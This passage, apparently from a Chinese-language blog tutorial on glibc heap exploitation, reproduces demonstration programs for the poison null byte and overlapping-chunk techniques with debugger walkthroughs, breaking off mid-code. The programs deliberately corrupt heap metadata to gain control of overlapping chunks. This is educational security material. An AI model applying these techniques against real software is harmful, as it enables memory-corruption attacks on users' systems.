<h2 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h2><h3 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* a;</span><br><span class="line">	<span class="type">uint8_t</span>* b;</span><br><span class="line">	<span class="type">uint8_t</span>* c;</span><br><span class="line">	<span class="type">uint8_t</span>* b1;</span><br><span class="line">	<span class="type">uint8_t</span>* b2;</span><br><span class="line">	<span class="type">uint8_t</span>* d;</span><br><span class="line">	<span class="type">void</span> *barrier;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">	a = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">int</span> real_a_size = <span class="built_in">malloc_usable_size</span>(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line">		<span class="string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">	 * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	c = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line">	<span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line">	<span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line">	<span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line">		<span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line">	<span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line">	<span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">	*(<span class="type">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* c_prev_size_ptr = ((<span class="type">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line">	<span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line">	<span class="comment">// will detect the heap corruption now.</span></span><br><span class="line">	<span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line">	<span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line">	<span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line">	<span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">		*((<span class="type">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="type">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="type">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">	b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line">		<span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line">		<span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="type">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">	b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(b1);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line">		<span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(<span class="built_in">strstr</span>(b2, <span class="string">&quot;DDDDDDDDDDDD&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>使用<code>glibc2.23</code>加参数<code>-g</code>编译并修改<code>rpath</code>。</p>
<h3 id="调试-7"><a href="#调试-7" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_U7NK7EPN83MV5VH.png"
                      alt="图片描述"
                ><br>申请了四个堆块,a(0x111),b(0x211),c(0x111),barrier(0x111)。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_DEP93F63ATZPHJZ.png"
                      alt="图片描述"
                ><br>因为我们要利用<code>off-by-null</code>把<code>chunkb</code>的<code>size</code>改为<code>0x200</code>，又因为是<code>chunkb</code>是<code>non-fast chunk</code>，将<code>b+0x1f0</code>的位置写为<code>0x200</code>绕过检查。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2Y8ADDBXUQXUG4R.png"
                      alt="图片描述"
                ><br>接下来<code>free(b)</code>后，假设<code>a</code>存在<code>off-by-null</code>漏洞，将<code>chunkb</code>改为了<code>0x200</code>大小。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_C8GR9YZ8AVVR6YS.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_DMWG5SBG4MM3W5S.png"
                      alt="图片描述"
                ><br>然后申请两个堆块<code>b1_real_size : 0x110</code>,<code>b2_real_size : 0x90</code>，然后<code>free(b1)</code>来绕过<code>unlink</code>检查，再<code>free(c)</code>后，会向上寻找<code>0x210</code>大小的堆块，发现<code>b1</code>是一个已经释放的<code>chunk</code>，便会合并，此时我们再去申请<code>real_size == 0x110+0x210</code>的堆块时，便控制了中间所有的<code>chunk</code>。</p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="overlapping-chunks-1"><a href="#overlapping-chunks-1" class="headerlink" title="overlapping_chunks_1"></a>overlapping_chunks_1</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-8"><a href="#源码-8" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis is a simple chunks overlapping problem\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s start to allocate 3 chunks on the heap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span></span><br><span class="line">		<span class="string">&quot; however, it is best to maintain the stability of the heap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span></span><br><span class="line">		<span class="string">&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line">	<span class="type">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line">		 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">	*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">	p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="type">char</span> *)p4, (<span class="type">char</span> *)p4+evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="type">char</span> *)p3, (<span class="type">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">		<span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-8"><a href="#调试-8" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_GHJ7RBMKB5Y8GMK.png"
                      alt="图片描述"
                ><br>首先申请三个堆块<code>p1_real:0x101</code>,<code>p2_real:0x101</code>,<code>p3_real:0x81</code>，这里只有申请<code>0x8</code>结尾的堆块才有下一个堆块<code>prev_size</code>的控制权，利用<code>off-by-one</code>漏洞。假设堆块<code>p1</code>读取时存在<code>off-by-one</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_V7X588ARHBXTSY8.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_W3A27VBAJ34ECCK.png"
                      alt="图片描述"
                ><br><code>free(p2)</code>后，利用<code>p1</code>的<code>off-by-one</code>漏洞将<code>chunk_p2</code>的<code>size</code>改为<code>0x180</code>，再次申请<code>0x178</code>大小的堆块，即可得到<code>p3</code>的控制权。</p>
<h2 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-9"><a href="#源码-9" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Yet another simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.</span></span><br><span class="line"><span class="comment"> This is also referenced as Nonadjacent Free Chunk Consolidation Attack.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line">  <span class="type">int</span> prev_in_use = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis is a simple chunks overlapping problem&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s start to allocate 5 chunks on the heap:&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  real_size_p1 = <span class="built_in">malloc_usable_size</span>(p1);</span><br><span class="line">  real_size_p2 = <span class="built_in">malloc_usable_size</span>(p2);</span><br><span class="line">  real_size_p3 = <span class="built_in">malloc_usable_size</span>(p3);</span><br><span class="line">  real_size_p4 = <span class="built_in">malloc_usable_size</span>(p4);</span><br><span class="line">  real_size_p5 = <span class="built_in">malloc_usable_size</span>(p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\n\nchunk p1 from %p to %p&quot;</span>, p1, (<span class="type">unsigned</span> <span class="type">char</span> *)p1+<span class="built_in">malloc_usable_size</span>(p1));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p2 from %p to %p&quot;</span>, p2,  (<span class="type">unsigned</span> <span class="type">char</span> *)p2+<span class="built_in">malloc_usable_size</span>(p2));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p3 from %p to %p&quot;</span>, p3,  (<span class="type">unsigned</span> <span class="type">char</span> *)p3+<span class="built_in">malloc_usable_size</span>(p3));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p4 from %p to %p&quot;</span>, p4, (<span class="type">unsigned</span> <span class="type">char</span> *)p4+<span class="built_in">malloc_usable_size</span>(p4));</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p5 from %p to %p\n&quot;</span>, p5,  (<span class="type">unsigned</span> <span class="type">char</span> *)p5+<span class="built_in">malloc_usable_size</span>(p5));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(p1,<span class="string">&#x27;A&#x27;</span>,real_size_p1);</span><br><span class="line">  <span class="built_in">memset</span>(p2,<span class="string">&#x27;B&#x27;</span>,real_size_p2);</span><br><span class="line">  <span class="built_in">memset</span>(p3,<span class="string">&#x27;C&#x27;</span>,real_size_p3);</span><br><span class="line">  <span class="built_in">memset</span>(p4,<span class="string">&#x27;D&#x27;</span>,real_size_p4);</span><br><span class="line">  <span class="built_in">memset</span>(p5,<span class="string">&#x27;E&#x27;</span>,real_size_p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s free the chunk p4.\nIn this case this isn&#x27;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p4);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">unsigned</span> <span class="type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="built_in">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">  real_size_p6 = <span class="built_in">malloc_usable_size</span>(p6);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nOur malloc() has been satisfied 